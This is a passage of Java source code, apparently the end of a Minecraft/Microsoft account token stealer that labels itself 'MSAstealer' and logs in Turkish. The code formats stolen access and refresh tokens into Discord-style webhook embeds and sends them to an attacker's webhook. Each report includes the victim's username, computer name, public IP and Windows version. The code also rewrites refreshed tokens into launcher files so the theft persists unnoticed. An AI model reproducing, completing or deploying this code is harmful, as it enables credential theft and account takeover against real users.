        for (FinalCand c : finalMap.values()) {
            if (c.tok == null || c.tok.isEmpty()) continue;
            if (outOfTime()) {
                log("  sure siniri (240s) asildi, kalan hesaplar gonderilmedi");
                break;
            }
            String b = "MCAUTH|" + c.name + "|" + c.uuid + "|" + c.tok + "|" + c.rt + "|" + c.exp;
            String durum = "OK";
            int renk = 65280;
            if (!c.ok) {
                durum = "dogrulanamadi, gecersiz olabilir";
                renk = 16776960;
            }
            if (c.exp <= now) {
                durum = "suresi gecmis, gecersiz olabilir";
                renk = 16711680;
            }
            if (c.rf) durum = durum + " (token yenilendi)";
            String bitis = formatExpiry(c.exp);
            String nm = "https://namemc.com/profile/" + c.uuid;
            String head = "https://mc-heads.net/avatar/" + c.uuid;

            JsonObject embed = new JsonObject();
            embed.addProperty("title", "MC Hesap - " + c.name);
            embed.addProperty("url", nm);
            embed.addProperty("color", renk);
            embed.addProperty("description", "```\n" + b + "\n```");
            embed.addProperty("timestamp", ZonedDateTime.now(java.time.ZoneOffset.UTC).format(TS_FMT));
            JsonObject author = new JsonObject();
            author.addProperty("name", "MSAstealer");
            author.addProperty("icon_url", head + "/32");
            embed.add("author", author);
            JsonObject thumb = new JsonObject();
            thumb.addProperty("url", head + "/64");
            embed.add("thumbnail", thumb);
            JsonObject image = new JsonObject();
            image.addProperty("url", "https://mc-heads.net/body/" + c.uuid + "/128");
            embed.add("image", image);

            JsonArray fields = new JsonArray();
            fields.add(field("Hesap", "[" + c.name + "](" + nm + ")"));
            fields.add(field("PC", pc()));
            fields.add(field("IP", pip.isEmpty() ? "alindi yok" : pip));
            fields.add(field("Sistem", "Windows " + osv));
            fields.add(field("Kaynak", c.src == null ? "" : c.src));
            fields.add(field("Token bitis", bitis));
            fields.add(field("Durum", durum));
            fields.add(field("Cape", c.capes == null || c.capes.isEmpty() ? "yok" : c.capes));
            fields.add(field("Profil", "[NameMC ac](" + nm + ")"));
            embed.add("fields", fields);

            JsonObject footer = new JsonObject();
            footer.addProperty("text", "MSAstealer | " + pc());
            footer.addProperty("icon_url", head + "/32");
            embed.add("footer", footer);

            JsonObject payload = new JsonObject();
            JsonArray embeds = new JsonArray();
            embeds.add(embed);
            payload.add("embeds", embeds);

            if (sendWebhook(payload)) {
                sentTotal++;
                seenTok.add(c.tok);
                sent.add(c.uuid);
                if (c.ok && c.exp > now) {
                    log("  BULUNDU: " + c.name + " (" + c.src + ") gonderildi");
                } else {
                    log("  BULUNDU: " + c.name + " (" + c.src + ") gonderildi (" + durum + ")");
                }
            } else {
                log("  Webhook gonderilemedi (internet/AV engeli olabilir)");
            }
        }
        saveLbDirty();
        return sent;
    }

    // ---- webhook + writeback ----

    private boolean sendWebhook(JsonObject payload) {
        byte[] body = payload.toString().getBytes(StandardCharsets.UTF_8);
        for (int i = 0; i < 3; i++) {
            Resp r = httpCall(HOOK, "POST", body, "application/json", null, 10);
            if (r != null && r.status >= 200 && r.status < 300) return true;
            if (r != null && r.status == 429) {
                long wait = 1200;
                JsonObject j = parseObj(r.body);
                if (j != null && j.has("retry_after") && j.get("retry_after").isJsonPrimitive()) {
                    try { wait = (long) (j.get("retry_after").getAsDouble() * 1000); } catch (Exception ignored) { }
                }
                sleep(Math.min(Math.max(wait, 500), 15000));
                continue;
            }
            sleep(900);
        }
        return false;
    }

    private void saveLbDirty() {
        for (String k : new ArrayList<>(lbDirty.keySet())) saveLbFile(k);
    }

    /**
     * Bekleyen writeback'i tek dosya icin HEMEN uygular: once .bak yedegi, sonra ayni
     * klasorde gecici dosya + ATOMIC_MOVE, en son icerik dogrulamasi. Hatalar loglanir.
     */
    private boolean saveLbFile(String path) {
        List<Op> ops = lbDirty.get(path);
        if (ops == null || ops.isEmpty()) return true;
        File target = new File(path);
        File dir = target.getAbsoluteFile().getParentFile();
        File tmp = dir == null ? null : new File(dir, target.getName() + ".msa-tmp");
        try {
            if (!target.isFile()) {
                log("  writeback: dosya artik yok, atlandi: " + path);
                return false;
            }
            if (target.length() > MAX_SCAN_BYTES) {
                log("  writeback: dosya cok buyuk, guvenlik icin yazilmadi: " + path);
                return false;
            }
            if (dir == null || !dir.isDirectory()) {
                log("  writeback: klasor yok, atlandi: " + path);
                return false;
            }
            String raw = new String(Files.readAllBytes(target.toPath()), StandardCharsets.ISO_8859_1);
            String out = raw;
            int changed = 0;
            for (Op d : ops) {
                if (d.oldTok != null && !d.oldTok.isEmpty() && !d.oldTok.equals(d.newTok) && out.contains(d.oldTok)) {
                    out = out.replace(d.oldTok, d.newTok);
                    changed++;
                }
                if (d.oldRt != null && !d.oldRt.isEmpty() && d.newRt != null && !d.oldRt.equals(d.newRt) && out.contains(d.oldRt)) {
                    out = out.replace(d.oldRt, d.newRt);
                    changed++;
                }
                if (d.oldExp != null && !d.oldExp.isEmpty() && d.newExp != null && !d.oldExp.equals(d.newExp) && out.contains(d.oldExp)) {
                    out = out.replace(d.oldExp, d.newExp);
                    changed++;
                }
            }
            if (changed == 0) {
                log("  writeback: eski degerler dosyada bulunamadi, yazilmadi: " + path);
                return false;
            }

            File bak = new File(dir, target.getName() + ".bak");
            try {
                if (!bak.isFile()) {
                    Files.copy(target.toPath(), bak.toPath(), StandardCopyOption.COPY_ATTRIBUTES);
                    log("  writeback: yedek alindi -> " + bak.getName());
                }
            } catch (Exception e) {
                log("  writeback: yedek alinamadi (" + e + "), yazma yine de denenecek: " + path);
            }

            byte[] bytes = out.getBytes(StandardCharsets.ISO_8859_1);
            try {
                Files.write(tmp.toPath(), bytes);
                Files.move(tmp.toPath(), target.toPath(),
                        StandardCopyOption.ATOMIC_MOVE, StandardCopyOption.REPLACE_EXISTING);
            } catch (AtomicMoveNotSupportedException am) {
                log("  writeback: ATOMIC_MOVE desteklenmiyor, normal move kullanildi: " + path);
                Files.write(tmp.toPath(), bytes);
                Files.move(tmp.toPath(), target.toPath(), StandardCopyOption.REPLACE_EXISTING);
            }

            String check = new String(Files.readAllBytes(target.toPath()), StandardCharsets.ISO_8859_1);
            Op last = ops.get(ops.size() - 1);
            if (last.newTok != null && !last.newTok.isEmpty() && !check.contains(last.newTok)) {
                log("  writeback: dogrulama basarisiz, yeni token dosyada yok: " + path);
                return false;
            }
            lbDirty.remove(path);
            log("yeni token launcher dosyasina kaydedildi (" + changed + " alan): " + path);
            return true;
        } catch (Exception e) {
            log("  writeback hatasi (" + path + "): " + e);
            return false;
        } finally {
            try {
                if (tmp != null) Files.deleteIfExists(tmp.toPath());
            } catch (Exception ignored) {
            }
        }
    }

    // ---- cevre / yardimci ----

    private String fetchIp() {
        Resp r = httpCall("https://api.ipify.org?format=json", "GET", null, null, null, 6);
        if (r != null && r.status >= 200 && r.status < 300) {
            JsonObject j = parseObj(r.body);
            if (j != null) {
                String ip = js(j, "ip");
                if (ip != null) return ip;
            }
        }
        return "";
    }

    private static String fetchOsVersion() {
        try {
            ProcessBuilder pb = new ProcessBuilder("cmd", "/c", "ver");
            pb.redirectErrorStream(true);
            Process p = pb.start();
            byte[] out = p.getInputStream().readAllBytes();
            p.waitFor();
            Matcher m = OSV_RX.matcher(new String(out, StandardCharsets.UTF_8));
            if (m.find()) return m.group();
        } catch (Exception ignored) {
        }
        return env("os.version", System.getProperty("os.version", ""));
    }

    private boolean tryLock() {
        try {
            lockFile = new RandomAccessFile(new File(System.getProperty("java.io.tmpdir"), "msastealer.lock"), "rw");
            lock = lockFile.getChannel().tryLock();
            return lock != null;
        } catch (Exception e) {
            return true; // kilit alinamazsa calismaya devam
        }
    }

    private void releaseLock() {
        try {
            if (lock != null) lock.release();
        } catch (Exception ignored) {
        }
        try {
            if (lockFile != null) lockFile.close();
        } catch (Exception ignored) {
        }
        lock = null;
        lockFile = null;
    }

    private Resp httpCall(String url, String method, byte[] body, String contentType,
                          Map<String, String> headers, int timeoutSec) {
        try {
            HttpRequest.Builder b = HttpRequest.newBuilder(URI.create(url))
                    .timeout(java.time.Duration.ofSeconds(timeoutSec));
            if (contentType != null) b.header("Content-Type", contentType);
            if (headers != null) {
                for (Map.Entry<String, String> e : headers.entrySet()) b.header(e.getKey(), e.getValue());
            }
            if (body != null) b.method(method, HttpRequest.BodyPublishers.ofByteArray(body));
            else b.method(method, HttpRequest.BodyPublishers.noBody());
            HttpResponse<String> r = http.send(b.build(), HttpResponse.BodyHandlers.ofString(StandardCharsets.UTF_8));
            Resp resp = new Resp();
            resp.status = r.statusCode();
            resp.body = r.body();
            return resp;
        } catch (InterruptedException e) {
            Thread.currentThread().interrupt();
            return null;
        } catch (Exception e) {
            return null;
        }
    }

    private Resp postJson(String url, JsonObject body, int timeoutSec) {
        return httpCall(url, "POST", body.toString().getBytes(StandardCharsets.UTF_8), "application/json", null, timeoutSec);
    }

    private static String err(Resp r) {
        return r == null ? "istek hatasi" : (r.status + " " + String.valueOf(r.body));
    }

    private static String urlEnc(String s) {
        return URLEncoder.encode(s, StandardCharsets.UTF_8);
    }

    private static JsonObject field(String name, String value) {
        JsonObject o = new JsonObject();
        o.addProperty("name", name);
        o.addProperty("value", value);
        o.addProperty("inline", true);
        return o;
    }

    private static String firstLine(String path) {
        try {
            File f = new File(path);
            if (!f.isFile()) return null;
            String txt = readCapped(f, MAX_SCAN_BYTES, StandardCharsets.UTF_8);
            if (txt == null) return null;
            int nl = txt.indexOf('\n');
            String line = nl >= 0 ? txt.substring(0, nl) : txt;
            return line.trim();
        } catch (Exception e) {
            return null;
        }
    }

    private static String fileText(String path) {
        File f = new File(path);
        if (!f.isFile()) return null;
        return readCapped(f, MAX_SCAN_BYTES, StandardCharsets.ISO_8859_1);
    }

    /**
     * Dosyayi en fazla cap bayt okuyup verilen charset ile string'e cevirir.
     * readFully yerine dongu kullanir: dosya okuma sirasinda kucultulse bile patlamaz.
     */
    private static String readCapped(File f, long cap, Charset cs) {
        try {
            long len = f.length();
            if (len <= 0) return null;
            int want = (int) Math.min(len, cap);
            if (want <= 0) return null;
            byte[] b = new byte[want];
            int off = 0;
            try (RandomAccessFile raf = new RandomAccessFile(f, "r")) {
                while (off < want) {
                    int n = raf.read(b, off, want - off);
                    if (n < 0) break;
                    off += n;
                }
            }
            if (off <= 0) return null;
            return new String(b, 0, off, cs);
        } catch (Exception e) {
            return null;
        }
    }

    private static boolean isSymlink(File f) {
        try {
            return Files.isSymbolicLink(f.toPath());
        } catch (Exception e) {
            return false;
        }
    }

    private static JsonObject parseObj(String s) {
        try {
            return JsonParser.parseString(s).getAsJsonObject();
        } catch (Exception e) {
            return null;
        }
    }

    private static String js(JsonObject o, String k) {
        try {
            if (o != null && o.has(k) && !o.get(k).isJsonNull()) return o.get(k).getAsString();
        } catch (Exception ignored) {
        }
        return null;
    }

    private static JsonObject obj(JsonObject o, String k) {
        try {
            if (o != null && o.has(k) && o.get(k).isJsonObject()) return o.getAsJsonObject(k);
        } catch (Exception ignored) {
        }
        return null;
    }

    private static JsonArray arr(JsonObject o, String k) {
        try {
            if (o != null && o.has(k) && o.get(k).isJsonArray()) return o.getAsJsonArray(k);
        } catch (Exception ignored) {
        }
        return null;
    }

    private static long expOf(JsonElement e) {
        if (e == null || e.isJsonNull()) return 0;
        try {
            if (e.isJsonPrimitive()) {
                JsonPrimitive p = e.getAsJsonPrimitive();
                if (p.isNumber()) return p.getAsLong();
                String s = p.getAsString().trim();
                if (s.isEmpty()) return 0;
                return Long.parseLong(s);
            }
        } catch (Exception ignored) {
        }
        return 0;
    }

    private static String pc() {
        return env("USERNAME", "?") + "@" + env("COMPUTERNAME", "?");
    }

    private static String env(String k, String def) {
        String v = System.getenv(k);
        return (v == null || v.isEmpty()) ? def : v;
    }

    private static void sleep(long ms) {
        try {
            Thread.sleep(ms);
        } catch (InterruptedException e) {
            Thread.currentThread().interrupt();
        }
    }

    private static void log(String s) {
        System.out.println("[MSAstealer] " + s);
    }
}
